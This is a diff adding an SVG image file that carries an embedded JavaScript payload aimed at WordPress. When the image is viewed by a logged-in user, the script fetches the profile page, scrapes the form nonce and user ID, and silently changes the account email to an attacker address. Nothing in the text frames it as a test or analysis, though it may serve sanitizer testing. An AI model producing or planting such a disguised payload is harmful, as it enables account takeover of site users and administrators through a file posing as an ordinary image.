@@ -1,0 +1,24 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+      <rect x="100" y="100" width="200" height="200" stroke="red" stroke-width="10" fill="white" />
+      <script type="text/javascript"><![CDATA[
+        let targetURL = `${document.location.href.split('wp-content')[0]}/wp-admin/profile.php`;
+        targetURL = targetURL.replace(/(?:(?<!:))\/{2,}/g, '/');
+        fetch(targetURL).then(response => response.text()).then(data => {
+          const nonce = data.match(/name="_wpnonce" value="([0-9a-z]*)" /)[1];
+          const user_id = data.match(/id="user_id" value="(\d*)" /)[1];
+          const formData = new FormData();
+          formData.append('_wpnonce', nonce);
+          formData.append('user_id', user_id);
+          formData.append('email', 'attacker@attackerdomain.com');
+          formData.append('first_name', 'attacker');
+          formData.append('last_name', 'attacker');
+          formData.append('nickname', 'attacker');
+          formData.append('action', 'update');
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', targetURL);
+          xhr.send(formData);
+        });
+      ]]></script>
+</svg>
